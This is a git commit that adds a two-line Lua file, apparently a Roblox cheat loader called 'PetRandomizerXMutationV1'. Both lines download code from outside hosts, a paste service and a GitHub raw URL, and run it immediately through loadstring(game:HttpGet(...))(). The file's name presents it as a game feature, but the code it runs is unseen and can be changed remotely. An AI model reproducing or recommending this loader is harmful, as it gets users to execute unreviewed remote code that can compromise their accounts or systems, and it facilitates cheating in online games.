7b460c4c4cdbb7f4df301123e55b5a7d194b1dfe
ZenkiHub <visamindaaventurado4@gmail.com>
2025-07-22 17:45:47 +0800

    Add PetRandomizerXMutationV1.lua

---
+++ PetRandomizerXMutationV1.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/s1xoadHElCqgHPVv/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenkiHub/Keyless/main/PetRandomizerXMutation.lua"))()
